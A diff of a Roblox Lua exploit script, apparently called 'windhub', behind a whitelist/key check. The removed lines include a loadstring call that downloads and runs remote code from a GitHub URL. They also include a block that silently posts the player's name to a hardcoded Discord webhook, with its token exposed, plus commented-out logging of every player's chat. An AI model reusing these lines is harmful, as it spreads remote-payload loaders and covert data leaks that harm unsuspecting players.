@@ -87,7 +87,6 @@ TextButton.TextWrapped = true
 TextButton.MouseButton1Click:connect(function()
 	if game.Players.LocalPlayer.UserId == number then 
 		Frame:Destroy()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/hellothere425/sfsafsafsa/main/test', true))()
 		local commands = {}
 		local poop = false
 		local prefix = "!"
@@ -4701,41 +4700,6 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/hellothere425/sfsafsa
 		print('F2 for binded respawn without FF, F1 for binded respawn with ff\n F3 for binded respawn with noarms')
 
 	else
-
-		local wh = 'https://discord.com/api/webhooks/893227338240761896/16bCPttPwDVJdO6ZvtesaP9FY9Q5L485LBaZ5YdkvNFmGPn0_asP7G7tCq_TTHThPXVt'
-
-
-local embed1 = {
-         ['title'] = game.Players.LocalPlayer.Name.." just tried to execute windhub and was successful!"
-   }
-local a = syn.request({
-   Url = wh,
-   Headers = {['Content-Type'] = 'application/json'},
-   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
-   Method = "POST"
-})
-function logMsg(Webhook, Player)
-   local embed = {
-       ['description'] =nil
-   }
-   local a = syn.request({
-       Url = Webhook,
-       Headers = {['Content-Type'] = 'application/json'},
-       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
-       Method = "POST"
-   })
-end
-for i,v in pairs(game.Players:GetPlayers()) do
- --  v.Chatted:Connect(function(msg)
-     --  logMsg(wh, v.Name, msg)
-  -- end)
-end
-
-game.Players.PlayerAdded:Connect(function(plr)
-  -- plr.Chatted:Connect(function(msg)
-    --   logMsg(wh, plr.Name, msg)
-   --end)
-end)
 		game.Players.LocalPlayer:Kick('u r either not whitelisted or got wrong key\n ask force to give you key and whitelist u')
 	end
 end)
